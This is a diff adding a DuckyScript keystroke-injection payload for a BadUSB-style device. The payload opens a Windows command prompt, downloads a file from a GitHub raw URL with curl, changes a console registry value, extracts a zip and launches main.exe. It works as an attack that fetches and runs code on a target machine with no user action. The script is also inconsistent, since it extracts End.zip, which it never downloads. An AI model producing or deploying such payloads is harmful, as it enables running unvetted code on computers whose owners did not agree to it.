@@ -1,0 +1,33 @@
+WINDOWS r
+DELAY 500
+STRING cmd
+ENTER
+DELAY 500
+STRING cd C:\
+ENTER
+DELAY 500
+STRING mkdir matrix
+ENTER
+DELAY 500
+STRING cd matrix
+ENTER
+DELAY 500
+STRING curl -O -L https://raw.githubusercontent.com/Saturno14/matrix/main/matrix.py
+ENTER
+DELAY 5000
+STRING reg add HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1
+ENTER
+DELAY 5000
+STRING No
+ENTER
+DELAY 500
+STRING tar -xf End.zip
+ENTER
+DELAY 5000
+STRING cd C:\matrix\main\dist\main\
+ENTER
+STRING main.exe
+ENTER
+DELAY 500
+F11
+
